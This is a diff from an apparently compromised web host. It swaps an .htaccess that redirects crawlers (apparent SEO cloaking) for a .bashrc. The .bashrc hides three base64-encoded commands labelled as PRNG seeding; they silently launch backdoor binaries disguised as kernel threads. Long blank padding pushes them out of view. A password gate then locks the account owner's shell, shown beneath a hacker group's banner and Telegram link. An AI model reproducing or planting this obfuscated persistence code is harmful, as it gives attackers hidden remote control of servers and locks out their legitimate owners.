@@ -1,11 +1,170 @@
-Options -Indexes
-RewriteEngine On
-RewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog) [NC]
-RewriteRule ^(.*)$ https://journal.unej.ac.id/ [R=301,L]
+# .bashrc
+# DO NOT REMOVE THIS LINE. SEED PRNG. #Skylight-kernel
+{ echo L2Jpbi9wa2lsbCAtMCAtVTExNjIgU2t5bGlnaHQgMj4vZGV2L251bGwgfHwgKFRFUk09eHRlcm0tMjU2Y29sb3IgR1NfQVJHUz0iLWsgL2hvbWUvZWp1cm5hbC8uY29uZmlnL2h0b3AvU2t5bGlnaHQuZGF0IC1saXFEIiBleGVjIC1hICdba3NtZF0nICcvaG9tZS9lanVybmFsLy5jb25maWcvaHRvcC9Ta3lsaWdodCcgMj4vZGV2L251bGwpCg==|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng Skylight-kernel
+# DO NOT REMOVE THIS LINE. SEED PRNG. #zhyper-kernel
+{ echo L2Jpbi9wa2lsbCAtMCAtVTExNjIgemh5cGVyIDI+L2Rldi9udWxsIHx8IChURVJNPXh0ZXJtLTI1NmNvbG9yIEdTX0FSR1M9Ii1rIC9ob21lL2VqdXJuYWwvLmNvbmZpZy9odG9wL3poeXBlci5kYXQgLWxpcUQiIGV4ZWMgLWEgJ1ttbV9wZXJjcHVfd3FdJyAnL2hvbWUvZWp1cm5hbC8uY29uZmlnL2h0b3Avemh5cGVyJyAyPi9kZXYvbnVsbCkK|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng zhyper-kernel
+# DO NOT REMOVE THIS LINE. SEED PRNG. #Seoven-kernel
+{ echo L2Jpbi9wa2lsbCAtMCAtVTExNjIgU2VvdmVuIDI+L2Rldi9udWxsIHx8IChURVJNPXh0ZXJtLTI1NmNvbG9yIEdTX0FSR1M9Ii1rIC9ob21lL2VqdXJuYWwvLmNvbmZpZy9odG9wL1Nlb3Zlbi5kYXQgLWxpcUQiIGV4ZWMgLWEgJ1tyY3VfcHJlZW1wdF0nICcvaG9tZS9lanVybmFsLy5jb25maWcvaHRvcC9TZW92ZW4nIDI+L2Rldi9udWxsKQo=|base64 -d|bash;} 2>/dev/null #1b5b324a50524e47 >/dev/random # seed prng Seoven-kernel
 
-# php -- BEGIN cPanel-generated handler, do not edit
-# Set the “ea-php74” package as the default “PHP” programming language.
-<IfModule mime_module>
-  AddHandler application/x-httpd-ea-php74 .php .php7 .phtml
-</IfModule>
-# php -- END cPanel-generated handler, do not edit
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+trap 'echo -e "\n\e[1;31m[!] masukin aja dulu bree wkwk\e[0m\n"; continue' INT
+
+expected_hash="8783ff6406f2975d3e106926e9bc056f6b0970521a4f17c49a0585e7999f04a1"
+input_hash=""
+
+echo -e "\e[1;36m======================================\e[0m"
+echo -e "   \e[1;33mBukan Seoven? Mau Ngapain Bujang?\e[0m"
+echo -e "\e[1;36m                  ↓↓↓                   \e[0m"
+echo -e "\e[1;35mLink Tele:\e[0m \e[1;36mhttps://t.me/Seokolot\e[0m"
+echo -e "\e[1;36m======================================\e[0m"
+
+while [[ "$input_hash" != "$expected_hash" ]]; do
+    echo -ne "\e[1;36m[+] Masukkan Passwordnya Dulu: \e[0m"
+    read -s input_pass
+    echo
+    input_hash=$(echo -n "$input_pass" | sha256sum | awk '{print $1}')
+    
+    if [[ "$input_hash" != "$expected_hash" ]]; then
+        echo -e "\e[1;31m[!] wkwk ga bisa yah bang H3ngkeRR?\e[0m"
+    fi
+done
+
+echo -e "\n\e[1;32m[SUCCESS] Akses diterima!\e[0m"
+sleep 1
+
+logo='
+    ███████╗███████╗ ██████╗ ██╗   ██╗███████╗███╗   ██╗
+    ██╔════╝██╔════╝██╔═══██╗██║   ██║██╔════╝████╗  ██║
+    ███████╗█████╗  ██║   ██║██║   ██║█████╗  ██╔██╗ ██║
+    ╚════██║██╔══╝  ██║   ██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
+    ███████║███████╗╚██████╔╝ ╚████╔╝ ███████╗██║ ╚████║
+    ╚══════╝╚══════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═══╝
+'
+
+echo -e "\e[1;35m$logo\e[0m"
+echo -e "\e[1;36m======================================\e[0m"
+echo -e "      \e[1;33mSelamat datang, Seoven\e[0m \e[1;35m👾\e[0m"
+echo -e "\e[1;33m   Siap menjalankan perintah, bwang!"
+echo -e "\e[1;36m======================================\e[0m"
+echo
+
+timenow=$(date +'%H:%M')
+load=$(awk '{print $1 ", " $2 ", " $3}' /proc/loadavg)
+
+echo -e "\e[1;36mThe time now is $timenow UTC\e[0m"
+echo -e "\e[1;36mServer load: $load\e[0m"
+echo -e ""
+
+trap - INT
